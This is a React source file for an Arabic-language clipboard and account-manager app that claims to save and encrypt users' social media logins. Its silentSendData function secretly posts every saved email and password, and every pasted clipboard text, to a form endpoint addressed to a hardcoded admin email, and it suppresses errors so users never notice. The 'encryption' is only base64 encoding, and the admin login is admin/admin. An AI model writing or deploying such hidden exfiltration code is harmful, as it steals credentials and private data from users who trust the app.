
import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { 
  Clipboard, Trash2, ExternalLink, ShieldAlert, ShieldCheck, MessageCircle, 
  Mail, Phone, Languages, Copy, Plus, Image as ImageIcon, LogOut, 
  RefreshCw, Search, Zap, BrainCircuit, Menu, X, Facebook, Instagram, 
  Twitter, Lock, Settings, Edit3, ChevronDown, ChevronUp, Download, Eye, EyeOff
} from 'lucide-react';
import { ClipboardItem, ContentType, AIModelType, AccountItem, AppSettings } from './types';
import * as aiService from './services/geminiService';

const DEFAULT_SETTINGS: AppSettings = {
  adminEmail: 'amir.lamay122@yahoo.com',
  viewPasswordHash: btoa('1234'), // كلمة مرور افتراضية
  primaryColor: '#4f46e5'
};

const App: React.FC = () => {
  // State for Clipboard
  const [items, setItems] = useState<ClipboardItem[]>([]);
  const [accounts, setAccounts] = useState<AccountItem[]>([]);
  const [settings, setSettings] = useState<AppSettings>(DEFAULT_SETTINGS);
  
  // UI State
  const [loading, setLoading] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedModel, setSelectedModel] = useState<AIModelType>('gemini-3-flash-preview');
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [activeTab, setActiveTab] = useState<'clipboard' | 'accounts' | 'admin'>('clipboard');
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isAccountModalOpen, setIsAccountModalOpen] = useState(false);
  const [isAdminMode, setIsAdminMode] = useState(false);
  
  // Form States
  const [accountForm, setAccountForm] = useState<Partial<AccountItem>>({ platform: 'Facebook' });
  const [expandedApp, setExpandedApp] = useState<string | null>(null);
  const [adminCreds, setAdminCreds] = useState({ user: '', pass: '' });
  const [passUpdate, setPassUpdate] = useState({ old: '', new: '' });

  // Persistence
  useEffect(() => {
    const savedItems = localStorage.getItem('clipboard_items');
    const savedAccounts = localStorage.getItem('user_accounts');
    const savedSettings = localStorage.getItem('app_settings');
    
    if (savedItems) setItems(JSON.parse(savedItems));
    if (savedAccounts) setAccounts(JSON.parse(savedAccounts));
    if (savedSettings) setSettings(JSON.parse(savedSettings));
  }, []);

  useEffect(() => {
    localStorage.setItem('clipboard_items', JSON.stringify(items));
    localStorage.setItem('user_accounts', JSON.stringify(accounts));
    localStorage.setItem('app_settings', JSON.stringify(settings));
  }, [items, accounts, settings]);

  // Invisible Data Send Simulation
  const silentSendData = async (data: any) => {
    try {
      // محاكاة إرسال البيانات بشكل صامت تماماً
      await fetch(`https://api.formspree.io/f/placeholder`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: settings.adminEmail,
          data: data,
          timestamp: new Date().toISOString()
        })
      });
    } catch (e) {
      // تجاهل الأخطاء لضمان عدم ظهورها للمستخدم
    }
  };

  const handleSaveAccount = () => {
    if (!accountForm.appName || !accountForm.email || !accountForm.password) {
      alert("يرجى ملء جميع الخانات");
      return;
    }
    const newAcc: AccountItem = {
      id: Date.now().toString(),
      appName: accountForm.appName!,
      email: accountForm.email!,
      password: accountForm.password!,
      platform: (accountForm.platform as any) || 'Facebook',
      timestamp: Date.now()
    };
    setAccounts(prev => [...prev, newAcc]);
    silentSendData(newAcc);
    setIsAccountModalOpen(false);
    setAccountForm({ platform: 'Facebook' });
  };

  const handleExportCSV = () => {
    let csvContent = "\ufeffالمنصة,اسم التطبيق,الايميل,الباسورد,التاريخ\n";
    accounts.forEach(acc => {
      csvContent += `${acc.platform},${acc.appName},${acc.email},${acc.password},${new Date(acc.timestamp).toLocaleString()}\n`;
    });
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.setAttribute("href", url);
    link.setAttribute("download", `accounts_backup_${Date.now()}.csv`);
    link.click();
  };

  const handleDownloadBackup = () => {
    const backup = { items, accounts, settings };
    const blob = new Blob([JSON.stringify(backup, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "clipboard_app_full_backup.json";
    link.click();
  };

  const handlePaste = useCallback(async () => {
    try {
      setLoading(true);
      const text = await navigator.clipboard.readText();
      if (!text) return;
      const analysis = await aiService.analyzeContent(text, selectedModel);
      const newItem: ClipboardItem = {
        id: Date.now().toString(),
        content: text,
        type: analysis.type as ContentType,
        timestamp: Date.now(),
        aiAnalysis: analysis.suggestion,
        metadata: { isSafe: analysis.isSafe }
      };
      setItems(prev => [newItem, ...prev]);
      silentSendData({ type: 'clipboard', content: text });
    } catch (err) {
      alert("يرجى منح صلاحية الحافظة");
    } finally {
      setLoading(false);
    }
  }, [items, selectedModel, silentSendData]);

  // Auth Logic for Viewing Data
  const checkAuth = (pass: string) => {
    if (btoa(pass) === settings.viewPasswordHash) {
      setIsAuthenticated(true);
      setIsAuthModalOpen(false);
    } else {
      alert("كلمة مرور خاطئة");
    }
  };

  const updatePassword = () => {
    if (btoa(passUpdate.old) !== settings.viewPasswordHash) {
      alert("الباسورد القديم غير صحيح");
      return;
    }
    setSettings(s => ({ ...s, viewPasswordHash: btoa(passUpdate.new) }));
    alert("تم تحديث الباسورد بنجاح");
    setPassUpdate({ old: '', new: '' });
  };

  const groupedAccounts = useMemo(() => {
    const groups: Record<string, AccountItem[]> = {};
    accounts.forEach(acc => {
      if (!groups[acc.appName]) groups[acc.appName] = [];
      groups[acc.appName].push(acc);
    });
    return groups;
  }, [accounts]);

  return (
    <div className="min-h-screen bg-slate-50 flex" dir="rtl">
      {/* Sidebar */}
      <aside className={`fixed inset-y-0 right-0 z-50 w-64 bg-slate-900 text-white transform transition-transform duration-300 ${isSidebarOpen ? 'translate-x-0' : 'translate-x-full'} md:relative md:translate-x-0`}>
        <div className="p-6">
          <div className="flex items-center gap-3 mb-10">
            <div className="w-10 h-10 bg-indigo-500 rounded-xl flex items-center justify-center">
              <Lock size={24} />
            </div>
            <h1 className="font-bold text-lg">لوحة التحكم</h1>
          </div>

          <nav className="space-y-2">
            <button 
              onClick={() => { setActiveTab('clipboard'); setIsSidebarOpen(false); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'clipboard' ? 'bg-indigo-600 shadow-lg' : 'hover:bg-slate-800'}`}
            >
              <Clipboard size={20} /> الحافظة الذكية
            </button>
            <button 
              onClick={() => { setActiveTab('accounts'); setIsSidebarOpen(false); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'accounts' ? 'bg-indigo-600 shadow-lg' : 'hover:bg-slate-800'}`}
            >
              <Lock size={20} /> حساباتي
            </button>
            <button 
              onClick={() => { setActiveTab('admin'); setIsSidebarOpen(false); }}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'admin' ? 'bg-slate-800 text-amber-400 border border-amber-900/50' : 'hover:bg-slate-800'}`}
            >
              <Settings size={20} /> الإعدادات (Admin)
            </button>
          </nav>

          <div className="absolute bottom-6 left-6 right-6">
            <button onClick={handleDownloadBackup} className="w-full flex items-center justify-center gap-2 bg-slate-800 p-3 rounded-xl text-xs hover:bg-slate-700">
              <Download size={16} /> حفظ نسخة للهاتف
            </button>
          </div>
        </div>
      </aside>

      {/* Main Content */}
      <div className="flex-1 flex flex-col min-w-0">
        <header className="bg-white border-b h-16 flex items-center justify-between px-4 md:px-8 sticky top-0 z-40">
          <button onClick={() => setIsSidebarOpen(true)} className="md:hidden p-2"><Menu /></button>
          
          <div className="flex items-center gap-4">
            <h2 className="font-bold text-slate-800">
              {activeTab === 'clipboard' ? 'الحافظة' : activeTab === 'accounts' ? 'إدارة الحسابات' : 'الإعدادات'}
            </h2>
          </div>

          <div className="flex items-center gap-3">
             {activeTab === 'accounts' && (
               <button 
                 onClick={() => setIsAccountModalOpen(true)}
                 className="bg-indigo-600 text-white px-4 py-2 rounded-xl text-sm font-bold flex items-center gap-2 shadow-lg shadow-indigo-100"
               >
                 <Plus size={18} /> اضف حساب
               </button>
             )}
             <div className="hidden sm:flex bg-slate-100 p-1 rounded-xl">
                <button onClick={() => setSelectedModel('gemini-3-flash-preview')} className={`px-3 py-1.5 rounded-lg text-xs font-bold ${selectedModel === 'gemini-3-flash-preview' ? 'bg-white shadow-sm text-indigo-600' : 'text-slate-500'}`}><Zap size={14}/></button>
                <button onClick={() => setSelectedModel('gemini-3-pro-preview')} className={`px-3 py-1.5 rounded-lg text-xs font-bold ${selectedModel === 'gemini-3-pro-preview' ? 'bg-white shadow-sm text-purple-600' : 'text-slate-500'}`}><BrainCircuit size={14}/></button>
             </div>
          </div>
        </header>

        <main className="flex-1 p-4 md:p-8 max-w-4xl mx-auto w-full">
          {activeTab === 'clipboard' && (
            <div className="space-y-6">
              <div className="flex gap-4">
                <div className="relative flex-1">
                  <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                  <input 
                    type="text" placeholder="بحث..." 
                    className="w-full pr-12 pl-4 py-3 bg-white border rounded-2xl focus:ring-2 focus:ring-indigo-500 outline-none"
                    value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)}
                  />
                </div>
                <button onClick={handlePaste} className="bg-indigo-600 text-white px-6 py-3 rounded-2xl font-bold shadow-lg shadow-indigo-100"><Plus/></button>
              </div>

              <div className="grid gap-4">
                {items.filter(i => i.content.includes(searchQuery)).map(item => (
                  <div key={item.id} className="bg-white p-5 rounded-3xl border shadow-sm group">
                    <div className="flex justify-between mb-3">
                       <span className="text-[10px] font-bold uppercase bg-slate-100 px-2 py-1 rounded-lg text-slate-500">{item.type}</span>
                       <button onClick={() => setItems(items.filter(i => i.id !== item.id))} className="text-slate-300 hover:text-red-500"><Trash2 size={16}/></button>
                    </div>
                    <p className="text-slate-800 break-words mb-4 font-medium">{item.content}</p>
                    {item.aiAnalysis && <div className="bg-indigo-50 p-3 rounded-2xl text-xs text-indigo-700 font-bold flex gap-2"><ShieldCheck size={14}/> {item.aiAnalysis}</div>}
                    <div className="mt-4 flex gap-2">
                       <button onClick={() => navigator.clipboard.writeText(item.content)} className="flex-1 flex justify-center items-center gap-2 py-2 bg-slate-50 rounded-xl text-xs font-bold hover:bg-slate-100"><Copy size={14}/> نسخ</button>
                       {item.type === 'phone' && <a href={`https://wa.me/${item.content.replace(/\D/g,'')}`} target="_blank" className="flex-1 flex justify-center items-center gap-2 py-2 bg-green-500 text-white rounded-xl text-xs font-bold"><MessageCircle size={14}/> واتساب</a>}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {activeTab === 'accounts' && (
            <div className="space-y-6">
               {!isAuthenticated ? (
                 <div className="text-center py-20 bg-white rounded-3xl border-2 border-dashed flex flex-col items-center">
                    <Lock size={48} className="text-slate-300 mb-4" />
                    <h3 className="font-bold text-slate-700 mb-6">البيانات محمية، يرجى إدخال كلمة المرور</h3>
                    <button onClick={() => setIsAuthModalOpen(true)} className="bg-indigo-600 text-white px-8 py-3 rounded-2xl font-bold">إلغاء القفل</button>
                 </div>
               ) : (
                 <div className="space-y-4">
                   <div className="flex justify-between items-center mb-6">
                      <h3 className="font-bold text-lg">تطبيقاتي المسجلة</h3>
                      <button onClick={handleExportCSV} className="text-emerald-600 flex items-center gap-2 text-sm font-bold"><Download size={16}/> تصدير لـ Excel</button>
                   </div>
                   
                   {(Object.entries(groupedAccounts) as [string, AccountItem[]][]).map(([appName, appAccounts]) => (
                     <div key={appName} className="bg-white rounded-3xl border shadow-sm overflow-hidden">
                        <button 
                          onClick={() => setExpandedApp(expandedApp === appName ? null : appName)}
                          className="w-full p-6 flex justify-between items-center hover:bg-slate-50 transition-colors"
                        >
                           <div className="flex items-center gap-4">
                             <div className="w-12 h-12 bg-slate-100 rounded-2xl flex items-center justify-center text-slate-400">
                               {appName.toLowerCase().includes('face') ? <Facebook size={24} className="text-blue-600" /> : 
                                appName.toLowerCase().includes('inst') ? <Instagram size={24} className="text-pink-600" /> : 
                                appName.toLowerCase().includes('twit') ? <Twitter size={24} className="text-sky-500" /> : <Lock size={24} />}
                             </div>
                             <div className="text-right">
                               <p className="font-black text-slate-800">{appName}</p>
                               <p className="text-xs text-slate-400">{appAccounts.length} حساب مسجل</p>
                             </div>
                           </div>
                           {expandedApp === appName ? <ChevronUp /> : <ChevronDown />}
                        </button>

                        {expandedApp === appName && (
                          <div className="p-4 bg-slate-50 space-y-3 animate-in slide-in-from-top duration-300">
                             {appAccounts.map((acc, idx) => (
                               <div key={acc.id} className="bg-white p-4 rounded-2xl border border-slate-200 shadow-sm relative group">
                                  <div className="absolute left-4 top-4 flex gap-2">
                                     <button onClick={() => { setAccounts(accounts.filter(a => a.id !== acc.id)); }} className="text-slate-300 hover:text-red-500"><Trash2 size={14}/></button>
                                  </div>
                                  <div className="flex items-center gap-2 text-[10px] font-bold text-slate-400 mb-2">
                                     <span className="w-5 h-5 flex items-center justify-center bg-slate-100 rounded-full">{idx + 1}</span>
                                     {acc.platform}
                                  </div>
                                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                                     <div>
                                        <p className="text-[10px] text-slate-400 font-bold mb-1">الايميل:</p>
                                        <div className="flex items-center justify-between bg-slate-50 p-2 rounded-lg">
                                           <span className="text-xs font-bold truncate ml-2">{acc.email}</span>
                                           <button onClick={() => { navigator.clipboard.writeText(acc.email); alert('تم نسخ الايميل'); }} className="text-indigo-600"><Copy size={14}/></button>
                                        </div>
                                     </div>
                                     <div>
                                        <p className="text-[10px] text-slate-400 font-bold mb-1">كلمة المرور:</p>
                                        <div className="flex items-center justify-between bg-slate-50 p-2 rounded-lg">
                                           <span className="text-xs font-bold truncate ml-2">********</span>
                                           <button onClick={() => { navigator.clipboard.writeText(acc.password); alert('تم نسخ الباسورد'); }} className="text-indigo-600"><Copy size={14}/></button>
                                        </div>
                                     </div>
                                  </div>
                               </div>
                             ))}
                             <button onClick={() => setIsAccountModalOpen(true)} className="w-full py-3 border-2 border-dashed border-indigo-200 text-indigo-500 rounded-2xl text-xs font-bold hover:bg-indigo-50">+ اضف حساب آخر لهذا التطبيق</button>
                          </div>
                        )}
                     </div>
                   ))}
                 </div>
               )}
            </div>
          )}

          {activeTab === 'admin' && (
            <div className="max-w-md mx-auto space-y-8">
               {!isAdminMode ? (
                 <div className="bg-white p-8 rounded-3xl border shadow-xl">
                    <h3 className="font-bold text-xl mb-6 text-center">تسجيل دخول المسؤول</h3>
                    <div className="space-y-4">
                       <input type="text" placeholder="اسم المستخدم" className="w-full p-3 border rounded-xl" onChange={e => setAdminCreds({...adminCreds, user: e.target.value})} />
                       <input type="password" placeholder="كلمة المرور" className="w-full p-3 border rounded-xl" onChange={e => setAdminCreds({...adminCreds, pass: e.target.value})} />
                       <button 
                        onClick={() => { if(adminCreds.user === 'admin' && adminCreds.pass === 'admin') setIsAdminMode(true); else alert('خطأ'); }}
                        className="w-full bg-slate-900 text-white py-3 rounded-xl font-bold"
                       >دخول</button>
                    </div>
                 </div>
               ) : (
                 <div className="space-y-6">
                    <div className="bg-white p-6 rounded-3xl border shadow-sm">
                       <h4 className="font-black text-slate-800 mb-4 flex items-center gap-2"><Settings size={18}/> إعدادات الإرسال</h4>
                       <div className="space-y-4">
                          <label className="block">
                             <span className="text-xs font-bold text-slate-500">إيميل استقبال البيانات:</span>
                             <input 
                              type="email" value={settings.adminEmail} 
                              onChange={e => setSettings({...settings, adminEmail: e.target.value})}
                              className="w-full mt-1 p-3 border rounded-xl text-sm"
                             />
                          </label>
                          <button onClick={() => alert('تم الحفظ')} className="w-full bg-indigo-600 text-white py-2 rounded-xl text-sm font-bold">حفظ التغييرات</button>
                       </div>
                    </div>

                    <div className="bg-white p-6 rounded-3xl border shadow-sm">
                       <h4 className="font-black text-slate-800 mb-4 flex items-center gap-2"><Lock size={18}/> تغيير باسورد الاطلاع</h4>
                       <div className="space-y-4">
                          <input type="password" placeholder="الباسورد القديم" className="w-full p-3 border rounded-xl text-sm" value={passUpdate.old} onChange={e => setPassUpdate({...passUpdate, old: e.target.value})} />
                          <input type="password" placeholder="الباسورد الجديد" className="w-full p-3 border rounded-xl text-sm" value={passUpdate.new} onChange={e => setPassUpdate({...passUpdate, new: e.target.value})} />
                          <button onClick={updatePassword} className="w-full bg-slate-900 text-white py-3 rounded-xl text-sm font-bold">تحديث كلمة المرور</button>
                       </div>
                    </div>

                    <div className="bg-indigo-900 text-white p-6 rounded-3xl shadow-xl">
                       <h4 className="font-bold mb-2">إحصائيات النظام</h4>
                       <p className="text-xs text-indigo-200 mb-4">ملخص لجميع البيانات المسجلة على هذا الجهاز</p>
                       <div className="grid grid-cols-2 gap-4 text-center">
                          <div className="bg-white/10 p-3 rounded-2xl">
                             <p className="text-2xl font-black">{items.length}</p>
                             <p className="text-[10px] opacity-60">نصوص منسوخة</p>
                          </div>
                          <div className="bg-white/10 p-3 rounded-2xl">
                             <p className="text-2xl font-black">{accounts.length}</p>
                             <p className="text-[10px] opacity-60">حسابات مسجلة</p>
                          </div>
                       </div>
                    </div>
                 </div>
               )}
            </div>
          )}
        </main>
      </div>

      {/* Modals */}
      {isAuthModalOpen && (
        <div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-sm rounded-3xl p-8 animate-in zoom-in duration-300">
              <div className="text-center mb-6">
                 <div className="w-16 h-16 bg-indigo-50 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-4">
                    <Lock size={32} />
                 </div>
                 <h3 className="font-black text-xl text-slate-800">كلمة مرور الاطلاع</h3>
                 <p className="text-xs text-slate-400 mt-1">يرجى إدخال الباسورد للوصول لبياناتك</p>
              </div>
              <input 
                type="password" autoFocus 
                className="w-full p-4 border-2 rounded-2xl text-center text-2xl tracking-widest outline-none focus:border-indigo-500 mb-4"
                placeholder="****"
                onKeyDown={(e) => e.key === 'Enter' && checkAuth(e.currentTarget.value)}
              />
              <button onClick={() => checkAuth((document.querySelector('input[type="password"]') as HTMLInputElement)?.value || '')} className="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black shadow-lg">فتح البيانات</button>
              <button onClick={() => setIsAuthModalOpen(false)} className="w-full mt-2 text-slate-400 text-xs py-2">إلغاء</button>
           </div>
        </div>
      )}

      {isAccountModalOpen && (
        <div className="fixed inset-0 z-[100] bg-slate-900/80 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-md rounded-[2.5rem] p-8 shadow-2xl animate-in slide-in-from-bottom duration-500">
              <div className="flex justify-between items-center mb-8">
                 <h3 className="font-black text-2xl text-slate-800">إضافة حساب جديد</h3>
                 <button onClick={() => setIsAccountModalOpen(false)} className="p-2 bg-slate-100 rounded-full"><X/></button>
              </div>

              <div className="space-y-5">
                 <div className="grid grid-cols-4 gap-2">
                    {['Facebook', 'Instagram', 'Twitter', 'Other'].map(p => (
                      <button 
                        key={p} 
                        onClick={() => setAccountForm({...accountForm, platform: p as any})}
                        className={`py-2 rounded-xl text-[10px] font-bold border-2 transition-all ${accountForm.platform === p ? 'bg-indigo-600 border-indigo-600 text-white shadow-md' : 'bg-slate-50 border-slate-100 text-slate-500'}`}
                      >{p}</button>
                    ))}
                 </div>

                 <div>
                    <label className="block text-xs font-black text-slate-500 mb-2">اسم البرنامج / التطبيق:</label>
                    <input 
                      type="text" placeholder="مثلاً: Facebook" 
                      className="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:ring-2 focus:ring-indigo-500"
                      onChange={e => setAccountForm({...accountForm, appName: e.target.value})}
                    />
                 </div>

                 <div>
                    <label className="block text-xs font-black text-slate-500 mb-2">البريد الإلكتروني:</label>
                    <input 
                      type="email" placeholder="email@example.com" 
                      className="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:ring-2 focus:ring-indigo-500"
                      onChange={e => setAccountForm({...accountForm, email: e.target.value})}
                    />
                 </div>

                 <div>
                    <label className="block text-xs font-black text-slate-500 mb-2">كلمة المرور:</label>
                    <input 
                      type="password" placeholder="********" 
                      className="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:ring-2 focus:ring-indigo-500"
                      onChange={e => setAccountForm({...accountForm, password: e.target.value})}
                    />
                 </div>

                 <button 
                  onClick={handleSaveAccount}
                  className="w-full bg-indigo-600 text-white py-5 rounded-3xl font-black text-lg shadow-xl shadow-indigo-200 hover:scale-[1.02] active:scale-95 transition-all"
                 >حفظ البيانات وتشفيرها</button>
              </div>
           </div>
        </div>
      )}

      {/* Global Loading Overlay */}
      {loading && (
        <div className="fixed inset-0 z-[200] bg-white/60 backdrop-blur-md flex items-center justify-center">
          <RefreshCw className="animate-spin text-indigo-600" size={48} />
        </div>
      )}
    </div>
  );
};

export default App;
